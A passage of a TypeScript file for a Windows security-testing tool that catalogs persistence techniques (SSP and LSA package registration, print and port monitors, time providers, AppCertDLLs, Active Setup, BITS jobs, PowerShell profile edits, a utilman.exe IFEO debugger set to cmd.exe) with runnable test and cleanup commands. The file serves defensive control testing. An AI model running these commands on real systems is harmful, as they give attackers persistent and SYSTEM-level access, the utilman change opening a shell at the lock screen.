        command: String.raw`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\MagicAtomicsTest" /v Driver /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsMonitor.dll" /f && reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\MagicAtomicsTest" /v Driver >nul 2>&1 && (echo ALLOWED: Print Monitor DLL registered) || (echo BLOCKED: Print Monitor registration was prevented)`,
        cleanup: String.raw`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\MagicAtomicsTest" /f 2>nul`,
        description: String.raw`Registers a test DLL as a Print Monitor. The Print Spooler loads all registered monitor DLLs at startup as SYSTEM. Tests detection of print subsystem abuse.`,
      },
    ],
  },
  {
    id: String.raw`security-support-provider`,
    name: String.raw`Security Support Provider (SSP)`,
    description: String.raw`Registers a DLL as a Security Support Provider by adding it to the Security Packages registry value. SSP DLLs are loaded by lsass.exe at boot, giving access to plaintext credentials as they are authenticated.`,
    techniqueId: String.raw`T1547.005`,
    techniqueIds: [String.raw`T1547.005`],
    reference: String.raw`https://persistence-info.github.io/Data/ssp.html`,
    variants: [
      {
        variantName: String.raw`SSP registry addition`,
        executor: "powershell",
        elevation: true,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$regPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'; try { $current = (Get-ItemProperty -Path $regPath -Name 'Security Packages' -ErrorAction Stop).'Security Packages'; if ($current -notcontains 'MagicAtomicsTestSSP') { $new = $current + 'MagicAtomicsTestSSP'; Set-ItemProperty -Path $regPath -Name 'Security Packages' -Value $new -ErrorAction Stop; Write-Host 'ALLOWED: SSP added to Security Packages list' } else { Write-Host 'SSP already present' } } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "$regPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'; $current = (Get-ItemProperty -Path $regPath -Name 'Security Packages' -ErrorAction SilentlyContinue).'Security Packages'; if ($current) { $new = $current | Where-Object { $_ -ne 'MagicAtomicsTestSSP' }; Set-ItemProperty -Path $regPath -Name 'Security Packages' -Value $new -ErrorAction SilentlyContinue }"`,
        description: String.raw`Adds a test SSP name to the Security Packages list in the LSA registry. At next boot, lsass.exe would attempt to load this DLL. Tests detection of LSASS credential interception persistence.`,
      },
    ],
  },
  {
    id: String.raw`authentication-package`,
    name: String.raw`Authentication Package`,
    description: String.raw`Registers a custom authentication package DLL that is loaded by lsass.exe at boot time. Similar to SSPs but loaded through the Authentication Packages registry value.`,
    techniqueId: String.raw`T1547.002`,
    techniqueIds: [String.raw`T1547.002`],
    reference: String.raw`https://persistence-info.github.io/Data/authenticationpackage.html`,
    variants: [
      {
        variantName: String.raw`Authentication Package registry addition`,
        executor: "powershell",
        elevation: true,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$regPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'; try { $current = (Get-ItemProperty -Path $regPath -Name 'Authentication Packages' -ErrorAction Stop).'Authentication Packages'; if ($current -notcontains 'MagicAtomicsTestAuth') { $new = $current + 'MagicAtomicsTestAuth'; Set-ItemProperty -Path $regPath -Name 'Authentication Packages' -Value $new -ErrorAction Stop; Write-Host 'ALLOWED: Authentication Package added to LSA registry' } else { Write-Host 'Auth package already present' } } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "$regPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'; $current = (Get-ItemProperty -Path $regPath -Name 'Authentication Packages' -ErrorAction SilentlyContinue).'Authentication Packages'; if ($current) { $new = $current | Where-Object { $_ -ne 'MagicAtomicsTestAuth' }; Set-ItemProperty -Path $regPath -Name 'Authentication Packages' -Value $new -ErrorAction SilentlyContinue }"`,
        description: String.raw`Adds a test authentication package to the LSA Authentication Packages registry value. Tests detection of LSASS persistence via custom authentication providers.`,
      },
    ],
  },
  {
    id: String.raw`time-provider`,
    name: String.raw`Time Provider Persistence`,
    description: String.raw`Registers a DLL as a Windows Time Service (W32Time) time provider. Time provider DLLs are loaded by svchost.exe running the W32Time service, providing persistence through an often-overlooked mechanism.`,
    techniqueId: String.raw`T1547.003`,
    techniqueIds: [String.raw`T1547.003`],
    reference: String.raw`https://persistence-info.github.io/Data/timeprovider.html`,
    variants: [
      {
        variantName: String.raw`Time Provider registry key`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MagicAtomicsTest" /v DllName /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsTime.dll" /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MagicAtomicsTest" /v Enabled /t REG_DWORD /d 1 /f && reg query "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MagicAtomicsTest" /v DllName >nul 2>&1 && (echo ALLOWED: Time Provider DLL registered) || (echo BLOCKED: Time Provider registration was prevented)`,
        cleanup: String.raw`reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MagicAtomicsTest" /f 2>nul`,
        description: String.raw`Registers a test DLL as a W32Time time provider. The Windows Time service loads registered provider DLLs, enabling persistence through this rarely-monitored service.`,
      },
    ],
  },
  {
    id: String.raw`office-startup`,
    name: String.raw`Office Application Startup`,
    description: String.raw`Modifies the Office Trusted Location or startup folder to load a template or add-in when Office applications start. Can also abuse the XLSTART folder or Word STARTUP folder for persistence.`,
    techniqueId: String.raw`T1137.001`,
    techniqueIds: [String.raw`T1137.001`],
    reference: String.raw`https://persistence-info.github.io/Data/officestartup.html`,
    variants: [
      {
        variantName: String.raw`Word STARTUP folder drop`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`if not exist "%APPDATA%\Microsoft\Word\STARTUP" mkdir "%APPDATA%\Microsoft\Word\STARTUP" && echo MagicAtomics Persistence Test > "%APPDATA%\Microsoft\Word\STARTUP\MagicAtomicsTest.txt" && if exist "%APPDATA%\Microsoft\Word\STARTUP\MagicAtomicsTest.txt" (echo ALLOWED: File dropped in Word STARTUP folder) else (echo BLOCKED: Word STARTUP folder write was prevented)`,
        cleanup: String.raw`del /f "%APPDATA%\Microsoft\Word\STARTUP\MagicAtomicsTest.txt" 2>nul`,
        description: String.raw`Drops a test file into the Word STARTUP directory. Real attacks would use a .dotm template with macros. Tests whether file creation in Office startup directories is monitored.`,
      },
    ],
  },
  {
    id: String.raw`bits-job-persist`,
    name: String.raw`BITS Job Persistence`,
    description: String.raw`Creates a Background Intelligent Transfer Service (BITS) job with a notification command. BITS jobs survive reboots and can be configured to execute a command upon completion, providing a stealthy persistence mechanism.`,
    techniqueId: String.raw`T1197`,
    techniqueIds: [String.raw`T1197`],
    reference: String.raw`https://persistence-info.github.io/Data/bitsjobs.html`,
    variants: [
      {
        variantName: String.raw`BITS job with notification command`,
        executor: "cmd",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`bitsadmin /create /download MagicAtomicsPersistTest && bitsadmin /addfile MagicAtomicsPersistTest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt "%TEMP%\MagicAtomicsBITS.txt" && bitsadmin /setnotifycmdline MagicAtomicsPersistTest C:\Windows\System32\calc.exe "" && bitsadmin /resume MagicAtomicsPersistTest && bitsadmin /info MagicAtomicsPersistTest /verbose >nul 2>&1 && (echo ALLOWED: BITS job with notification command created) || (echo BLOCKED: BITS job creation was prevented)`,
        cleanup: String.raw`bitsadmin /cancel MagicAtomicsPersistTest 2>nul & del /f "%TEMP%\MagicAtomicsBITS.txt" 2>nul`,
        description: String.raw`Creates a BITS download job with a notification command (calc.exe). When the download completes, BITS executes the notification command. Tests detection of BITS-based persistence.`,
      },
    ],
  },
  {
    id: String.raw`wmi-provider`,
    name: String.raw`WMI Provider Registration`,
    description: String.raw`Registers a custom WMI provider by adding registry entries under HKLM\SOFTWARE\Classes\CLSID. WMI providers are loaded by the WMI service (svchost.exe) and can execute arbitrary code.`,
    techniqueId: String.raw`T1546.003`,
    techniqueIds: [String.raw`T1546.003`],
    reference: String.raw`https://persistence-info.github.io/Data/wmiprovider.html`,
    variants: [
      {
        variantName: String.raw`WMI Provider CLSID registration`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\SOFTWARE\Classes\CLSID\{a1b2c3d4-e5f6-7890-abcd-ef1234567890}\InprocServer32" /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsWMIProv.dll" /f && reg query "HKLM\SOFTWARE\Classes\CLSID\{a1b2c3d4-e5f6-7890-abcd-ef1234567890}\InprocServer32" >nul 2>&1 && (echo ALLOWED: WMI Provider CLSID registered) || (echo BLOCKED: WMI Provider CLSID registration was prevented)`,
        cleanup: String.raw`reg delete "HKLM\SOFTWARE\Classes\CLSID\{a1b2c3d4-e5f6-7890-abcd-ef1234567890}" /f 2>nul`,
        description: String.raw`Registers a test CLSID with an InprocServer32 pointing to a test DLL. Tests whether new WMI provider registration is detected.`,
      },
    ],
  },
  {
    id: String.raw`active-setup`,
    name: String.raw`Active Setup Persistence`,
    description: String.raw`Creates an Active Setup registry entry under HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components. Active Setup entries run once per user at logon, making this useful for machine-wide persistence that executes in each user context.`,
    techniqueId: String.raw`T1547.014`,
    techniqueIds: [String.raw`T1547.014`],
    reference: String.raw`https://persistence-info.github.io/Data/activesetup.html`,
    variants: [
      {
        variantName: String.raw`Active Setup registry key`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\MagicAtomicsTest" /v StubPath /t REG_SZ /d "C:\Windows\System32\calc.exe" /f && reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\MagicAtomicsTest" /v StubPath >nul 2>&1 && (echo ALLOWED: Active Setup persistence entry created) || (echo BLOCKED: Active Setup persistence was prevented)`,
        cleanup: String.raw`reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\MagicAtomicsTest" /f 2>nul`,
        description: String.raw`Creates an Active Setup entry with a StubPath that runs calc.exe. Active Setup runs once per user profile, providing unique machine-wide persistence. Tests detection of Active Setup abuse.`,
      },
    ],
  },
  {
    id: String.raw`powershell-profile`,
    name: String.raw`PowerShell Profile Persistence`,
    description: String.raw`Modifies the PowerShell profile script so that malicious commands execute every time a PowerShell session starts. Profiles exist at user level and machine level.`,
    techniqueId: String.raw`T1546.013`,
    techniqueIds: [String.raw`T1546.013`],
    reference: String.raw`https://persistence-info.github.io/Data/powershellprofile.html`,
    variants: [
      {
        variantName: String.raw`User PowerShell profile modification`,
        executor: "powershell",
        elevation: false,
        riskLevel: "medium",
        command: String.raw`powershell.exe -NoProfile -Command "$profilePath = $PROFILE.CurrentUserAllHosts; $backupPath = \"$profilePath.magicatomics.bak\"; $testLine = '# MagicAtomics Persistence Test - Write-Host MagicAtomicsPersistenceActive'; try { if (Test-Path $profilePath) { Copy-Item $profilePath $backupPath -Force }; Add-Content -Path $profilePath -Value $testLine -ErrorAction Stop; $content = Get-Content $profilePath -Raw -ErrorAction Stop; if ($content -match 'MagicAtomicsPersistenceActive') { Write-Host 'ALLOWED: PowerShell profile persistence line added' } else { Write-Host 'BLOCKED: Profile modification failed' } } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "$profilePath = $PROFILE.CurrentUserAllHosts; $backupPath = \"$profilePath.magicatomics.bak\"; if (Test-Path $backupPath) { Copy-Item $backupPath $profilePath -Force; Remove-Item $backupPath -Force } elseif (Test-Path $profilePath) { $content = Get-Content $profilePath | Where-Object { $_ -notmatch 'MagicAtomicsPersistenceActive' }; if ($content) { Set-Content $profilePath $content } else { Remove-Item $profilePath -Force } }"`,
        description: String.raw`Appends a test line to the user's PowerShell profile. Backs up the existing profile first for safe cleanup. Tests whether profile-based persistence is monitored.`,
      },
    ],
  },
  {
    id: String.raw`accessibility-features`,
    name: String.raw`Accessibility Features Backdoor`,
    description: String.raw`Replaces or redirects accessibility programs (utilman.exe, osk.exe, narrator.exe, magnify.exe) to cmd.exe using IFEO or direct replacement. These programs can be triggered from the lock screen without authentication.`,
    techniqueId: String.raw`T1546.008`,
    techniqueIds: [String.raw`T1546.008`],
    reference: String.raw`https://persistence-info.github.io/Data/accessibilityfeatures.html`,
    variants: [
      {
        variantName: String.raw`Utilman IFEO debugger backdoor`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f && reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger >nul 2>&1 && (echo ALLOWED: Utility Manager backdoor via IFEO created) || (echo BLOCKED: Utilman IFEO backdoor was prevented)`,
        cleanup: String.raw`reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f 2>nul`,
        description: String.raw`Creates an IFEO debugger for utilman.exe (Utility Manager) pointing to cmd.exe. This allows launching a SYSTEM command prompt from the Windows lock screen by pressing Win+U.`,
      },
    ],
  },
  {
    id: String.raw`appcert-dlls`,
    name: String.raw`AppCert DLLs`,
    description: String.raw`Configures AppCertDLLs registry value to inject a DLL into every process that calls Win32 API functions like CreateProcess, CreateProcessAsUser, etc. Similar to AppInit DLLs but targets process creation APIs.`,
    techniqueId: String.raw`T1546.009`,
    techniqueIds: [String.raw`T1546.009`],
    reference: String.raw`https://persistence-info.github.io/Data/appcertdlls.html`,
    variants: [
      {
        variantName: String.raw`AppCertDLLs registry value`,
        executor: "cmd",
        elevation: true,
        riskLevel: "high",
        command: String.raw`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs" /v MagicAtomicsTest /t REG_SZ /d "C:\Windows\Temp\MagicAtomicsAppCert.dll" /f && reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs" /v MagicAtomicsTest >nul 2>&1 && (echo ALLOWED: AppCertDLLs entry created) || (echo BLOCKED: AppCertDLLs modification was prevented)`,
        cleanup: String.raw`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs" /v MagicAtomicsTest /f 2>nul`,
        description: String.raw`Adds a test DLL path to the AppCertDLLs registry key. DLLs listed here are loaded into every process that calls CreateProcess and related Win32 APIs. Tests detection of this DLL injection persistence method.`,
      },
    ],
  },
  {
    id: String.raw`port-monitor`,
    name: String.raw`Port Monitor Persistence`,
    description: String.raw`Registers a DLL as a port monitor under HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. Port monitors are loaded by spoolsv.exe (running as SYSTEM) and provide persistent, elevated code execution.`,
    techniqueId: String.raw`T1547.010`,
    techniqueIds: [String.raw`T1547.010`],
    reference: String.raw`https://persistence-info.github.io/Data/portmonitor.html`,
    variants: [
      {
        variantName: String.raw`Port Monitor registry entry via PowerShell`,
        executor: "powershell",
        elevation: true,
        riskLevel: "high",
        command: String.raw`powershell.exe -NoProfile -Command "$monPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\MagicAtomicsPortMon'; try { New-Item -Path $monPath -Force | Out-Null; Set-ItemProperty -Path $monPath -Name 'Driver' -Value 'C:\Windows\Temp\MagicAtomicsPortMon.dll' -ErrorAction Stop; Write-Host 'ALLOWED: Port Monitor DLL registered' } catch { Write-Host 'BLOCKED:' $_.Exception.Message }"`,
        cleanup: String.raw`powershell.exe -NoProfile -Command "Remove-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\MagicAtomicsPortMon' -Recurse -Force -ErrorAction SilentlyContinue"`,
        description: String.raw`Registers a test DLL as a Print Spooler port monitor using PowerShell. Port monitors run in the context of spoolsv.exe (SYSTEM). Tests detection of print subsystem persistence.`,
      },
    ],
  },
];


// Human-readable names for well-known technique IDs (verbatim from the Python).
const TECHNIQUE_NAMES: Record<string, string> = {
  "T1547.001": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
  "T1547.002": "Boot or Logon Autostart Execution: Authentication Package",
  "T1547.003": "Boot or Logon Autostart Execution: Time Providers",
  "T1547.004": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
  "T1547.005": "Boot or Logon Autostart Execution: Security Support Provider",
  "T1547.010": "Boot or Logon Autostart Execution: Port Monitors",
  "T1547.014": "Boot or Logon Autostart Execution: Active Setup",
  "T1053.005": "Scheduled Task/Job: Scheduled Task",
  "T1543.003": "Create or Modify System Process: Windows Service",
  "T1546.002": "Event Triggered Execution: Screensaver",
  "T1546.003": "Event Triggered Execution: WMI Event Subscription",
  "T1546.007": "Event Triggered Execution: Netsh Helper DLL",
  "T1546.008": "Event Triggered Execution: Accessibility Features",
  "T1546.009": "Event Triggered Execution: AppCert DLLs",
  "T1546.010": "Event Triggered Execution: AppInit DLLs",
  "T1546.012": "Event Triggered Execution: Image File Execution Options Injection",
  "T1546.013": "Event Triggered Execution: PowerShell Profile",
  "T1546.015": "Event Triggered Execution: Component Object Model Hijacking",
  "T1574.001": "Hijack Execution Flow: DLL Search Order Hijacking",
  "T1037.001": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
  "T1197": "BITS Jobs",
  "T1112": "Modify Registry",
  "T1137.001": "Office Application Startup: Office Template Macros",
};

function techniqueName(tid: string): string {
  return TECHNIQUE_NAMES[tid] ?? tid;
}

export class PersistenceInfoIngestor implements LotlIngestor {
  readonly sourceId = "persistence-info";
  readonly displayName = "Persistence-Info";
  readonly description =
    "Windows persistence mechanism prevention tests based on the persistence-info project. Tests registry Run keys, scheduled tasks, services, WMI subscriptions, COM hijacking, IFEO, AppInit DLLs, and 20+ other persistence techniques.";
  // Hardcoded source: no GitHub repo fetch (sync tolerates empty repo/branch).
  readonly repo = "";
  readonly branch = "";
  readonly repoUrl = "https://github.com/persistence-info/persistence-info.github.io";
  readonly platform = "windows";

  async collect(): Promise<NormalizedEntry[]> {
    const out: NormalizedEntry[] = [];

    for (const entry of PERSISTENCE_CATALOG) {
      const entryId = entry.id;
      const entryName = entry.name;
      const entryDesc = entry.description;
      const techniqueId = entry.techniqueId;
      const techniqueIds = entry.techniqueIds;
      const reference = entry.reference;

      for (const variant of entry.variants) {
        const variantName = variant.variantName;
        const testName = `Persistence: ${entryName} - ${variantName}`;

        const mitreTechniques: Record<string, string> = {};
        for (const tid of techniqueIds) mitreTechniques[tid] = techniqueName(tid);

        out.push({
          sourceRef: `${entryId}:${variantName}`,
          name: testName,
          description: `${variant.description} [${entryDesc.slice(0, 300)}]`.trim(),
          command: variant.command,
          executor: variant.executor,
          techniqueId,
          binaryPath: null,
          elevationRequired: variant.elevation,
          riskLevel: variant.riskLevel,
          platforms: ["windows"],
          cleanupCommand: variant.cleanup,
          metadata: {
            source: "persistence-info",
            mechanism_id: entryId,
            mechanism_name: entryName,
            variant: variantName,
            reference,
            mitre_techniques: mitreTechniques,
            technique_ids: techniqueIds,
            guidance: {
              what_this_tests: `Attempts to create ${entryName} persistence via ${variantName} and checks whether security controls block the operation.`,
              if_blocked: `Your security controls blocked ${entryName} persistence via ${variantName}. This persistence vector is covered.`,
              if_allowed: `ALLOWED: ${entryName} persistence was created via ${variantName}. Review your EDR/endpoint policies to detect or prevent this persistence mechanism.`,
              mitre_reference: `https://attack.mitre.org/techniques/${techniqueId.split(".").join("/")}/`,
            },
          },
          sourceUrl: reference || this.repoUrl,
        });
      }
    }

    return out;
  }
}
